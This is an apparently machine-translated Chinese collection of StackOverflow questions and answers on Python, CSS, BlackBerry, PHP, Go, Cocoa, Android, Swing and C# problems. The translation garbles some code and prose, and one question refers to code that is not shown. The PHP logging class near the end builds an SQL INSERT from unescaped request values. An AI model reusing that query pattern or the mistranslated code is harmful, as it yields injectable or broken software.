# StackOverflow 问答 13491000-13491999

# python - python，while循环，p值

> ID：13491001
> 
> 赞同：0
> 
> 时间：2012-11-21T10:17:39.533
> 
> 标签：python, mongodb, while-loop

我在调试这个程序时遇到了麻烦，它计算了许多推文的 p 值：

```
db = connection.data
shows = db.individual

def pvalue():
    #p-values of total tweets
    show_records = sorted([(m['total_tweets'], m) for m in db.individual.find()])

    index=0
    while index < len(show_records):    
         show = show_records[index]
        tweet_pvalue = 1 - (index + 1.0) / len(show_records)
        total=show['total_tweets']
        shows.update({"id": show[1]["id"]}, {'$set':{"pvalue_total_tweets":tweet_pvalue}})

    #need to remove several occurences of the same number of tweets to not false the p-value. 

        while show_records[index + 1]['total_tweets'] == total: #while next document has the same number of tweets
            index+=1
            show=show_records[index]
            shows.update({"id": show[1]["id"]}, {'$set':{"pvalue_total_tweets":tweet_pvalue}}) 
```

它返回：

```
total=show['total_tweets']
TypeError: tuple indices must be integers, not str 
```

非常感谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:37:46.853

```
show_records = sorted([(m['total_tweets'], m) for m in db.individual.find()]) 
```

这将返回一个元组列表，如`[(1, {'total_tweets': 1}), (2, {'total_tweets': 2}]`.

和这个

```
show = show_records[index] 
```

返回（例如，如果 index == 1） - `(2, {'total_tweets': 2})`，它是元组。而你正在尝试做

```
(2, {'total_tweets': 2})['total_tweets'] 
```

它会导致错误。你应该写：

```
(2, {'total_tweets': 2})[1]['total_tweets'] 
```

# html - 媒体查询：当高度和宽度为一定大小时执行

> ID：13491019
> 
> 赞同：1
> 
> 时间：2012-11-21T10:18:16.847
> 
> 标签：html, css, media-queries

有没有办法，例如，当浏览器被拖动到一定大小（比如 200 像素 x 200 像素）时更改背景颜色。我让它在宽度为 200 或高度为 200 时工作，但我希望它只在浏览器为 200 宽度和 200 高度时才会改变。我怎样才能将这两个查询组合起来，使它不是一个或，而是一个和。

这是代码，我需要将它们组合成 1 个查询，该查询在满足两个要求时都可以使用。

```
@media screen and (max-height: 500px) and (min-height: 490px) {
    p{
        color: red;
    }
    body{
        background-color: blue;
    }
@media screen and (max-width : 300px) and (min-width: 290px) {
    p{
        color: yellow;
    }
    body{
        background-color: green;
    } 
```

希望这很清楚，非常感谢提前

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:24:38.993

是的你可以。您必须将查询与`and`. 我在这里为您创建了一个小提琴[http://jsfiddle.net/HChTD/](http://jsfiddle.net/HChTD/)

**更新**

这是一个范围示例：http: [//jsfiddle.net/HChTD/1/](http://jsfiddle.net/HChTD/1/)

# css - 小屏幕的媒体查询 CSS

> ID：13491023
> 
> 赞同：1
> 
> 时间：2012-11-21T10:18:31.993
> 
> 标签：css, media-queries

问题：如何使用 css @media 来定位 1024x600 以下的所有屏幕？

我需要告诉所有的小屏幕使用overflow-x:scroll。

上下文：我必须在 HTML 和 BODY 标签上使用以下 CSS 规则：

溢出-x：隐藏！重要；

（否则某些动画会导致页面上出现难看的水平滚动条。）

但是现在，当使用较小的屏幕查看我的网站时，如果用户可以水平滚动页面会很好。

我会继续寻找一个可以做到这一点的css片段，但我发布这个是因为该网站刚刚上线并且即将受到大量流量的打击，所以我需要一些快速的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:31:15.667

我很快就找到了答案（http://www.javascriptkit.com/dhtmltutors/cssmediaqueries.shtml），但我仍然需要弄清楚如何在线测试。

```
/* CSS that's applied when the viewing area's width is 800px or less */
@media screen and (max-width: 800px){
  html{
  overflow-x:auto !important;
  }
  body{
  overflow-x:auto !important;
  }
} 
```

去哪里测试这是否真的有效，因为 testsize.com 没有显示滚动条（我不确定这是他们的限制还是我自己的限制）。

# blackberry - 从 res 文件夹 blackberry 读取文件

> ID：13491024
> 
> 赞同：0
> 
> 时间：2012-11-21T10:18:34.960
> 
> 标签：blackberry, java-me, inputstream, readfile

我想从黑莓上的“res”文件夹中读取文件。我使用的文件是文件 javascript。我使用了这段代码 `InputStream in = classs.getResourceAsStream("file.js");`。但我得到“找不到这条路”，我也使用

```
String srcFile = "/res/ressourcesWeb/file.js";
FileConnection srcConn = (FileConnection) Connector.open(srcFile, Connector.READ);
InputStream in = srcConn.openInputStream(); 
```

但我有一个例外。任何人都可以帮助我阅读文件并给我应该使用的正确路径吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T13:40:41.073

您的`res`文件夹必须在`src`文件夹内才能从您的代码中访问。

`src`文件夹是您的项目包的根文件夹。并且 src 文件夹之外的所有文件夹在运行时对代码都是不可见的。

查看此帖子了解更多详细信息：[Blackberry 运行时错误：FRIDG：找不到 img/logo.png](https://stackoverflow.com/questions/7022256/blackberry-runtime-error-fridg-could-not-find-img-logo-png/7026039#7026039)

有文件定位原则描述。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T21:29:16.743

实际上，您**无需**将资源放在`src`文件夹下，即可从您的代码中访问它们。

这是*一种*方法，但我认为这不是最好的方法。该文件夹下的`src`文件应该是真正的源代码，而不是图像或其他资源。对于 JavaScript 资源，它们是否应该是有争议的`src`。我见过的大多数项目`src`只使用该文件夹来存放**Java**源代码。

在任何情况下，如果您想将文件（或其他资源，如图像）保存在 src 文件夹之外，您可以这样做。当您创建一个新项目时，Eclipse 的 BlackBerry 插件实际上是这样设置的。`res`顶层有一个文件夹，在 (not under) 旁边`src`。

如果你有

```
src\
src\com\mycompany\myapp\
res\
res\resourcesWeb\
res\resourcesWeb\file.js 
```

然后，您可以像这样打开文件：

```
 String jsPath = "/resourcesWeb/file.js";
    InputStream input = getClass().getResourceAsStream(jsPath);
    byte [] content = IOUtilities.streamToBytes(input);
    String contentAsString = new String(content); 
```

* * *

PS [你也可以这样做](http://supportforums.blackberry.com/t5/Java-Development/how-to-use-getResourceAsStream/m-p/798237#M144783)：

```
 String jsPath = "/file.js";
    InputStream input = getClass().getResourceAsStream(jsPath); 
```

并且不指定资源的*路径*。显然，这只有在您的资源文件夹中没有命名冲突时才有效（例如，您没有`/res/resourcesWeb/file.js`and `/res/otherPath/file.js`）

# php - 多次使用 move_uploaded_file

> ID：13491027
> 
> 赞同：1
> 
> 时间：2012-11-21T10:18:38.233
> 
> 标签：php, file-upload

我在我的代码上调用了 move_uploaded_file 两次，但似乎第二个不起作用。

如果我互换他们的位置，

那么第一个会起作用，但第二个不会。

有什么建议吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T10:21:48.213

您不能两次移动文件。也许您正在寻找`copy()`. 当您移动文件时，原始文件不再存在。

文档： http: [//php.net/copy](http://php.net/copy)

您可以`move_uploaded_file`再次使用并从那里复制文件

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-21T10:30:08.307

表单 PHP 手册：[move_uploaded_file](http://php.net/manual/en/function.move-uploaded-file.php) — 将上传的文件移动到新位置

如果我理解正确，你可能会做的是，当你第一次调用`move_uploaded_file`函数时，你将上传的文件移动到一个新位置，然后当你`move_uploaded_file`第二次调用函数时，函数什么都不做，因为文件已经被移动了。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T10:21:59.890

[`move_uploaded_file()`](http://php.net/manual/en/function.move-uploaded-file.php)顾名思义，移动临时文件。调用后，临时文件不再存在，因为它已移动。

来自[手册](http://php.net/manual/en/function.move-uploaded-file.php)

> 如果文件有效，它将被移动到目的地给定的文件名。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-21T10:22:00.397

当然，当您移动一次文件时，它就不再存在了，就像您将文件从计算机中的一个文件夹移动到另一个文件夹一样。

在第二个“移动”中，您可以`copy()`用来复制文件：

[http://php.net/manual/es/function.copy.php](http://php.net/manual/es/function.copy.php)

# logging - 如何在 Go 库中实现惯用的日志记录？

> ID：13491032
> 
> 赞同：11
> 
> 时间：2012-11-21T10:18:44.940
> 
> 标签：logging, go, idioms

在 Go 中执行登录的惯用方式是什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-21T10:18:44.940

创建一个声明全局变量**logger**的文件。然后，使用 Go 的惯用[*init()*](http://golang.org/doc/effective_go.html#init)函数在启动时初始化变量。

**logger.go**：

```
package xxx

import (
    "log"
    "os"
)

var logger *log.Logger
func init() {
    logger = log.New(os.Stderr, "xxx: ", log.Ldate | log.Ltime | log.Lshortfile)
} 
```

**例子.go**：

```
func test() {
    logger.Println("Logged")
} 
```

此方法提供的好处是您可以使用可以从单个文件配置的单个记录器实现。

**编辑：** ThomasKappler 指出，如果您只使用单个全局记录器，则可以使用日志包的内置记录器并使用 SetFlags 对其进行配置。唯一的区别是您必须更明确并导入日志包。

# c# - 在 C 中引发和处理事件

> ID：13491037
> 
> 赞同：0
> 
> 时间：2012-11-21T10:18:55.440
> 
> 标签：c#, c, posix, libevent, libev

我正在将一些 C# 代码（主要是类）移植到 C。我已经分析了代码，并且移植绝对是可能的。我不确定的一件事是如何在 C 中处理（即实现）引发事件。

我在 Linux 环境中，我希望二进制文件只能在 Linux 上运行。我听说 GLib 支持事件，但对此知之甚少 - 任何帮助将不胜感激。

一个引发事件并在 C 中处理它的 hello world 示例将非常有用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:39:17.833

GLib 实现的 C# 事件的关闭是[GObject 信号](http://developer.gnome.org/gobject/unstable/signal.html)。

用于`g_signal_connect`将回调连接到现有信号，并`g_signal_emit`发出已注册的信号。有关详细信息，请参阅[文档](http://developer.gnome.org/gobject/stable/)。

由于您来自 C# 背景，您还可以考虑使用[Vala](https://live.gnome.org/Vala)，这是一种围绕 GObject 对象系统构建的编程语言，可编译为 C，并且感觉类似于 C# 或 Java。

# javascript - 将应用了 CSS3 过滤器的画布保存为图像

> ID：13491038
> 
> 赞同：3
> 
> 时间：2012-11-21T10:18:55.347
> 
> 标签：javascript, html, css, canvas

我已经将一些 CSS3 过滤器应用于画布上的图像，如下所示：

```
-webkit-filter brightness(0%) grayscale(100%) contrast(1000%) 
```

但是当我将图像保存到我的计算机时，保存的是原始图像，而不是应用过滤器的图像。有没有办法保存它的修改版本？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:25:06.683

使用着色器在画布中应用过滤器，而不是使用 CSS 样式。

~~或者，制作一个隐藏的画布，将内容绘制到该画布上，对其应用 CSS3 过滤器，然后使用该画布输出到可见画布。~~

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:22:59.317

过滤器设置画布元素的样式，而不是画布内容。
据我所知，您无法将页面的部分（Canvas+ 样式）转换为图像。

澄清一下：CSS 样式应用于 DOM 元素，而不是元素中的数据。
在这种情况下，这意味着当您将 CSS 阴影或其他东西应用到画布时，画布上的图像的实际数据不会被修改。

是的，您可以保存画布的数据，但不，CSS 样式不会反映在其上。

# cocoa - NSOutlineView 源列表样式，基于视图，改变字体

> ID：13491041
> 
> 赞同：5
> 
> 时间：2012-11-21T10:19:16.533
> 
> 标签：cocoa, nsoutlineview

我正在使用具有源列表样式的 NSOutlineView，并使用基于视图（而不是基于单元格）的大纲视图。

我希望能够使一些行加粗。但是，我尝试更改字体（在 IB 中手动，通过 viewForTableColumn:... 中的代码，或通过 Font Bold 绑定）到目前为止都被忽略了。

从这[条消息](http://www.cocoabuilder.com/archive/cocoa/316649-why-can-i-change-the-font-used-by-an-nstextfield.html)看来，这是因为 NSOutlineView 的源列表样式接管了管理文本字段的外观：

> 我猜您已经将文本字段连接到 NSTableCellView 的 textField 插座？如果是这样，我认为您可能会遇到 NSTableView 对源列表外观的自动管理。
> 
> 尝试从 textField 插座断开文本字段，看看您的自定义字体是否粘住。

如果我断开 textField 插座，外观确实在我的控制之下，并且我的胆量起作用了。

但是，现在我无法让它看起来像自动的。我的意思是，当 NSOutlineView 管理文本字段的外观时，字体是粗体并在选择任何项目时获得阴影，但是当我手动管理它时，情况并非如此。

任何人都可以回答以下任何一个问题：

1.  当 NSOutlineView 管理我的文本字段的外观时，如何使字体粗体绑定工作
2.  如果我没有 NSOutlineView 管理我的文本字段的外观，我怎样才能让它看起来和表现得像我管理它时那样？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-12T22:05:39.287

我想我找到了解决方案：

`NSTableCellView`通过在包含控件的单元格上设置属性来管理其`textField`插座的外观。`backgroundStyle`将此设置为`NSBackgroundStyleDark`触发一个特殊的路径，`NSTextFieldCell`其中基本上设置一个`attributedStringValue`，更改文本颜色并通过添加阴影`NSShadowAttributeName`。

你能做的有两件事：

*   在自定义行或单元格视图子类中自行设置`backgroundStyle`。
*   在单元格的文本字段中使用自定义`NSTextFieldCell`并更改行为/绘图。

我们做了后者，因为我们需要一个不同的外观主题（不同颜色）的表格视图。我们为此找到的最方便（尽管肯定不是最有效）的位置是`- drawInteriorWithFrame:inView:`在调用 super 之前覆盖和修改单元格的属性字符串，然后恢复原始字符串：

```
- (void)drawInteriorWithFrame:(NSRect)cellFrame inView:(NSView *)controlView
{
    NSAttributedString *originalString = self.attributedStringValue;

    // Customize string as you like
    if (/* whatever */)
        [self setAttributedStringValue: /* some string */];

    // Regular drawing
    [super drawInteriorWithFrame:cellFrame inView:controlView];

    // Reset string
    if (self.attributedStringValue != originalString)
        self.attributedStringValue = originalString;
} 
```

希望这可以帮助其他处于类似情况的人。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-14T00:08:20.743

不确定我是否遗漏了您的问题中的任何内容，但使用以下方法更改字体对我有用。`ReminderTableCellView`只是 NSTableCellView 的一个子类，添加了一个额外的 dateField。

```
- (NSView *)outlineView:(NSOutlineView *)outlineView viewForTableColumn:(NSTableColumn *)tableColumn item:(id)item {
    //LOG(@"viewForTableColumn called");
    // For the groups, we just return a regular text view.
    if ([_topLevelItems containsObject:item]) {
        //LOG(@" top level");
        NSTableCellView *result = [outlineView makeViewWithIdentifier:@"HeaderCell" owner:self];
        // Uppercase the string value, but don't set anything else. NSOutlineView automatically applies attributes as necessary
        NSString *value = [item uppercaseString];
        [result.textField setStringValue:value];
        //[result.textField setFont:[NSFont systemFontOfSize:[NSFont smallSystemFontSize]]];
        return result;
    } else  {
        //LOG(@" menu item");
        // The cell is setup in IB. The textField and imageView outlets are properly setup.
        // Special attributes are automatically applied by NSTableView/NSOutlineView for the source list
        ReminderTableCellView *result = [outlineView makeViewWithIdentifier:@"DataCell" owner:self];
        if ([item isKindOfClass:[OSTreeNode class]]) {
            [result.textField setFont:[NSFont boldSystemFontOfSize:13]];
            result.textField.stringValue = [item displayName];
            result.dateField.stringValue = [item nextReminderDateAsString];
        }
        else
            result.textField.stringValue = [item description];
        if (_loading)
            result.textField.textColor = [NSColor grayColor];
        else
            result.textField.textColor = [NSColor textColor];
        NSImage *image = [NSImage imageNamed:@"ReminderMenuIcon.png"];
        [image setSize:NSMakeSize(16,16)];
        [result.imageView setImage:image];
        //[result.imageView setImage:nil];
        return result;
    }
} 
```

生成的视图如下所示。请注意，这是一个选择了源列表选项的 NSOutlineView，但我不明白为什么这对普通的 outlineView 不起作用。

![在此处输入图像描述](../Images/4e6be5332ba1e9e6169fd52ff2a3898b.png)

# maven - 使用自己的插件进行资源过滤

> ID：13491042
> 
> 赞同：0
> 
> 时间：2012-11-21T10:19:18.247
> 
> 标签：maven, maven-plugin, maven-resources-plugin

目前我开发了自己的插件，它将通过加载影响资源过滤的其他文件来进行资源过滤。

我的插件（执行）方法中有以下代码：

```
public void execute() throws MojoExecutionException {
    if (StringUtils.isEmpty(encoding) && isFilteringEnabled(getResources())) {
        getLog().warn(
                "File encoding has not been set, using platform encoding "
                        + ReaderFactory.FILE_ENCODING
                        + ", i.e. build is platform dependent!");
    }
    Scope scope = convertToScope(getScope());
    getLog().info("Hallo welt. (" + scope + ")");

    if (getResources() != null) {
        for (Resource item : getResources()) {
            getLog().info(" --| Resource: " + item.getFiltering() + "|" + item.getDirectory());
        }
    }

    try {

        MavenResourcesExecution mavenResourcesExecution = new MavenResourcesExecution(
                resources, outputDirectory, project, encoding, null,
                nonFilteredFileExtensions, mavenSession);

        ValueSource valueSource = new ValueSource() {

            @Override
            public Object getValue(String expression) {
                getLog().info("Expression: " + expression);

                return "XXX";
            }

            @Override
            public List getFeedback() {
                getLog().info("getFeedback()");
                return Collections.EMPTY_LIST;
            }

            @Override
            public void clearFeedback() {
                // TODO Auto-generated method stub
                getLog().info("clearFeedback()");

            }
        };
        mavenResourcesExecution.addFilerWrapperWithEscaping(valueSource,
                "\\@", "\\@", "@", false);

        mavenResourcesExecution.setUseDefaultFilterWrappers(false);

        mavenResourcesFiltering.filterResources(mavenResourcesExecution);

    } catch (MavenFilteringException e) {
        throw new MojoExecutionException(e.getMessage(), e);
    }

} 
```

但是在我的集成测试期间，过滤不会完成。在我的输出中，我找不到 getValue()、getFeedback() 等的输出。

目前我的集成测试期间的输出如下所示：

```
[INFO] Hallo welt. ()
[INFO]  --| Resource: true|src/main/resource-files
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[DEBUG] resource with targetPath null
directory src/main/resource-files
excludes []
includes []
[DEBUG] ignoreDelta true
[INFO] Copying 1 resource
[DEBUG] file thisIsTheFirst.properties has a filtered file extension
[DEBUG] filtering ..it\configurationTest\src\main\resource-files\thisIsTheFirst.properties to ...\it\configurationTest\target\classes\thisIsTheFirst.properties 
```

但不幸的是，在这种情况下不会调用 getValue() 方法。

所以问题是：有人知道我做错了什么吗？（完整源代码可[在此处](https://gist.github.com/4124126)获得。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T12:31:48.847

解决方案是不使用正则表达式：

```
mavenResourcesExecution.addFilerWrapperWithEscaping(valueSource, "@", "@", "@", false); 
```

# android - 从 onhandleintent 启动异步任务

> ID：13491049
> 
> 赞同：4
> 
> 时间：2012-11-21T10:19:40.023
> 
> 标签：android, android-asynctask, worker

我们应该从`onHandleIntent()`方法中启动异步任务`IntentService`吗？我读到了`onHandleIntent()`，所以从那里`worker thread`开始会安全吗？`asyncTask`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:21:36.060

`IntentService`s 已经是后台进程；无需从那里启动 AsyncTask。~~此外，`AsyncTask`从任何地方开始都是“安全的”；~~这是一个帮助你多线程的助手类。如果您在 Activity 中使用它，请确保不要`View`在 AsyncTask 的-method 中操作它。`doInBackground()`

如果您需要在 IntentService 中生成多个线程，只需使用：

> > 新线程（可运行 r）.start（）；

请参阅[如何在 Android 中运行可运行线程？](https://stackoverflow.com/questions/1921514/how-to-run-a-runnable-thread-in-android)

如果您需要调用某种回调，请使用[Handler](http://developer.android.com/reference/android/os/Handler.html)。例如，请参阅[http://www.vogella.com/articles/AndroidPerformance/article.html#handler](http://www.vogella.com/articles/AndroidPerformance/article.html#handler)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:21:56.277

AsyncTask 类用于提供实现多线程的机制，因此您的事件线程不会被挂起，但是当您使用服务时，您不应该使用 Service 中的 AsyncTask，而是可以使用线程，如果一些长时间运行的任务将在服务中执行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-04-18T17:24:59.507

如果您确实需要在 IntentService 中使用 AsyncTask，您可以在 AsyncTask 中创建一个调用 de doInBackGround 和 onPostExecute 的方法。像这样的东西：

```
void executeFlowOnBackground(Params params) {
  onPostExecute(doInBackground(params));
} 
```

就我而言，我这样做是因为所有 App 请求都是由扩展 AsyncTask 的类发出的，并且由于实现难以重构代码。

# java - 带有 DefaultComboBoxModel 的 JComboBox 不允许添加或删除

> ID：13491053
> 
> 赞同：3
> 
> 时间：2012-11-21T10:19:54.017
> 
> 标签：java, swing, model, autocomplete, jcombobox

这是我的第一篇文章，我认为我做得对。

我有一个程序，它从 AutoComplete jComboBox 获取用户输入，然后将输入发送到文本文件中。（AutoComplete 使用库 glazedlists_java15/1.8.0 完成）。

**使用自动完成功能后，我必须将 jComboBox 设置为 DefaultComboBoxModel。**

当用户按下**Enter 键**时，**jComboBox 应该使用从键盘输入的新项目更新列表**，因此用户**可以看到**jComboBox 列表中最后输入的项目。

**这**是通过**从 jComboBox 中删除所有项目**然后**再次插入它们来**完成的。

问题是，**在**拥有**自动完成**功能之前，我只能说**jComboBox1.removeAllItems();** 但现在由于模型的原因，我必须使用 **model.removeAllElements();**

```
public class Test {
    final static DefaultComboBoxModel model = new DefaultComboBoxModel();
    static JComboBox c                = new JComboBox(model);
    private static final long serialVersionUID = 1L;
    private static JButton b = new JButton();
    static JFrame f = new JFrame();
    /**
     * @param args
     */
    public static void TestFrame() {
        String[] a = {"hi1" , "hi2", "hi3", "hi4","hi5"};
        AutoCompleteSupport support = AutoCompleteSupport.install(c,
                GlazedLists.eventListOf(a));
        JPanel test = new JPanel();
        test.add(b);
        test.add(c);
        model.addElement(a);
        b.addActionListener(new ActionListener() {

            public void actionPerformed(ActionEvent e) {

                model.removeAllElements();

            }

        });
        f.add(test);
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        f.setVisible(true);
        f.setSize(500,500);

    } 
```

问题是**model.removeAllElements();** 和**model.addElement(s)；**不工作，所以我不能更新 jComboBox。你能不能花点时间帮我找到解决方案。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T14:56:53.727

编辑：

我不知道你的问题出在哪里，这完全适合我

```
final DefaultComboBoxModel model = new DefaultComboBoxModel();
JComboBox c                = new JComboBox(model);
private static final long serialVersionUID = 1L;
private JButton b = new JButton();

public TestFrame() {
    JPanel test = new JPanel();
    test.add(b);
    test.add(c);
    model.addElement("hi");

    b.addActionListener(new ActionListener() {

        @Override
        public void actionPerformed(ActionEvent e) {
            model.removeAllElements();

        }
    });
    this.add(test);
    this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    this.setVisible(true);
    this.setSize(500,500);

} 
```

也许你没有联系到你的 keylistener

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-29T12:41:54.843

```
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.SwingUtilities;

import ca.odell.glazedlists.EventList;
import ca.odell.glazedlists.GlazedLists;
import ca.odell.glazedlists.swing.AutoCompleteSupport;

public class TestFrame
{
    private static JComboBox c = new JComboBox();
    private static JButton b = new JButton();
    private static JFrame f = new JFrame();
    private static String[] a = {"hi1", "hi2", "hi3", "hi4", "hi5"};

    public static void TestFrame()
    {
        final EventList<String> items = GlazedLists.eventListOf(a);
        AutoCompleteSupport.install(c, items);
        JPanel test = new JPanel();
        test.add(b);
        test.add(c);
        c.addActionListener(new ActionListener()
        {
            public void actionPerformed(ActionEvent e)
            {
                c = (JComboBox) e.getSource();

                if (e.getActionCommand().equals("comboBoxEdited"))
                {
                    items.clear();
                }
            }
        });
        b.addActionListener(new ActionListener()
        {
            public void actionPerformed(ActionEvent e)
            {
                items.clear();
            }
        });
        f.add(test);
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        f.setVisible(true);
        f.setSize(500, 500);
    }

    public static void main(String[] args)
    {
        SwingUtilities.invokeLater(new Runnable()
        {
            public void run()
            {
                TestFrame();
            }
        });
    }
} 
```

# c# - 你怎么知道用户在会话时间内不活跃？

> ID：13491057
> 
> 赞同：0
> 
> 时间：2012-11-21T10:20:07.993
> 
> 标签：c#, asp.net-mvc, session

如果用户在会话 1 小时内不活动，我需要从用户使用的数据库中释放数据。

怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:24:56.120

您可以在 web.config 中将会话超时调整为一小时，并将代码`Session_End`放入`Global.asax.cs`

# java - Java - 在圆周围画正方形

> ID：13491059
> 
> 赞同：0
> 
> 时间：2012-11-21T10:20:19.073
> 
> 标签：java, swing, graphics, resize, border

我有一个包含五个按钮的程序：

i) 正方形 ii) 矩形 iii) 圆形 iv) 三角形 v) 透明

单击前四个按钮中的任何一个，将使用以下代码在绘图画布上绘制相应的形状：

可以拖动形状。它们也应该调整大小。我只是想在形状的四个边缘（NW、NE、SW、SE）周围更改鼠标光标。这适用于正方形和矩形，因为它们有四个边。但是，我在为圆形和三角形实现相同时遇到了一些问题。

这就是我在 mouseClicked 事件中所做的：

我想要做的是，例如，如果字符串**shape_type**包含圆形，它会在其周围绘制一个边框，以便用户可以看到形状的边界。

但是，我不能只在 if 语句中使用以下代码：

请问怎么画边框？谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:56:53.043

你是对的，你不能用一种`MouseListener`方法来画画。您可以做的是`shapeUnderMouse`在您的`mouseClicked`方法中设置，然后调用`repaint`. 如果您只重新绘制您知道在视觉上发生变化的区域，您将获得更好的性能，但这并不是绝对必要的。

该`if (shapeUnderMouse != null)`块应放置在您的`paint`方法中。

# c# - 查找字符串前面是否有斜线

> ID：13491063
> 
> 赞同：0
> 
> 时间：2012-11-21T10:20:36.223
> 
> 标签：c#, string, indexof, backslash

我想查找一个字符串前面是否有“/”，在我的代码中，我得到了字符串的 indexof 并找出它之前的字符是否有任何东西，这有效，但我如何找到它是否真的是正斜杠。这是我的代码：

```
 string test = "/images/";

            if (test.IndexOf(@"images/") - 1 == -1)
            {

            } 
```

**编辑**

我的一些字符串可能有完整的 url，有些可能如上，有些可能根本没有 / 因此使用索引

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T10:22:04.297

你的意思是：

```
if (test.StartsWith("/")) 
```

? （尚不清楚您的示例代码试图实现什么。）

请注意，“/”是正斜杠，而不是反斜杠 - 在您的情况下，您不需要逐字字符串文字，因为该字符串不包含任何反斜杠或换行符。

编辑：你的问题不清楚，但我怀疑你想要这样的东西：

```
int index = test.IndexOf(targetString);
if (index > 0 && test[index - 1] == '/')
{
    // There's a leading forward slash. Deal with it appropriately
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:22:34.707

您可以使用[方法 StartsWith()](http://msdn.microsoft.com/en-us/library/system.string.startswith.aspx)：

```
 if(test.StartsWith("/"))
    {
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:31:16.960

```
if (test.StartsWith("images") ||
    test.IndexOf("/images") > -1 ||
    test.IndexOf("\\images") > -1) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T11:16:26.450

太多好的答案:)

无论如何，我想说的是：

```
string str = "/\images\///";
Match matchfirstFwdSlash = Regex.Match(str, "^[\\/]", RegexOptions.IgnoreCase);
if (matchfirstFwdSlash.Success)
   {MessageBox .Show ("Success","Success");}
else
   {MessageBox .Show ("Oops","Oops");} 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-21T10:28:05.910

//你可以这样找到

```
 string test = "/Images/";

        string a = test.Split('/')[0];

        if (a=="")
        {

        } 
```

# php - 单例实例，如何写写self

> ID：13491065
> 
> 赞同：1
> 
> 时间：2012-11-21T10:20:39.120
> 
> 标签：php, oop, singleton

我正在寻找一种方法来扩展我们的默认日志记录类，而无需更改整个应用程序或库。我们有很多地方可以写日志。例如：

```
App_Log::getInstance()->write(
    $name,
    $type,
    "LOGOUT",
    $url
); 
```

Auth_Log

```
<?php
class App_Auth_Log {

    /**
     * Singleton instance
     *
     * Marked only as protected to allow extension of the class. To extend,
     * simply override {@link getInstance()}.
     *
     * @var App_Auth_Log
     */
    protected static $_instance = null;

    /**
     * Auth logging enabled flag.
     *
     * @var boolean
     */
    protected $_enabled = false;

    /**
     * If flag is true then cleanup will not remove login records.
     *
     * @var boolean
     */
    protected $_keepLoginRecords = false;

    /**
     * Class constructor.
     */
    public function __construct() {
        if(App_Front::getInstance()->hasParam("withAuthLog"))
            $this->_enabled = true;

        if(App_Front::getInstance()->hasParam("withKeepLoginRecords"))
            $this->_keepLoginRecords = true;

        $this->cleanup();
    }

    /**
     * Singleton instance
     *
     * @return App_Auth_Log
     */
    public static function getInstance() {
        if (is_null(self::$_instance))
            self::$_instance = new self();
        return self::$_instance;
    }

    /**
     * Write new auth log record with given details. if succesful then method
     * returns true otherwise returns false.
     *
     * @param string $class
     * @param string $ident
     * @param string $action
     * @param string $url
     * @param string $ipaddr
     * @return boolean
     * @throws Exception
     */
    public function write($class,$ident,$action,$url,$ipaddr=null) {

        if($this->isEnabled())  {
            $db = App_Db_Connections::getInstance()->getConnection();
            try {

                // if address not specificed get remote addr
                $ipaddr = ($ipaddr == null) ? $_SERVER['REMOTE_ADDR'] : $ipaddr;

                // manual insert so we can take advantage of insert delayed
                $stmnt = "INSERT INTO accesslogs
                    VALUES('',NOW(),'$class','$ident','$action','$url','$ipaddr')";

                // execute insert
                $db->query($stmnt);

            } catch (Exception $e) {
                throw $e;
            }
            return true;
        }
        return false;
    }

    /**
     * Cleanup old accesslog records. Cached to run once a day.
     *
     * @return boolean - returns true if run false if not.
     */
    public function cleanup() {

        $cache  = App_Cache::getInstance()->newObject(86400);

        if($this->isEnabled()) {

            if (!$res = $cache->load(App_Cache::getCacheName(__CLASS__. "cleanup"))) {
                // add cache
                $db = App_Db_Connections::getInstance()->getConnection();
                try {
                    $where = $db->quoteInto("DATEDIFF(NOW(),accesslog_datetime) > ?", 6);
                    $and = ($this->_keepLoginRecords) ? " AND accesslog_action != 'LOGIN'" : "";
                    $db->query("DELETE LOW_PRIORITY FROM accesslogs WHERE $where $and");
                } catch (Exception $e) {
                    throw $e;
                }

                $cache->save($res,App_Cache::getCacheName(__CLASS__. "cleanup"));
            } // end cache
        }
        return;
    }

    /**
     * Returns boolean check if auth log enabled.
     *
     * @return boolean
     */
    public function isEnabled() {
        return ($this->_enabled) ? true : false;
    }

    /**
     * Enabled disable the auth log process.
     *
     * @param boolean $boolean
     * @return App_Auth_Log
     */
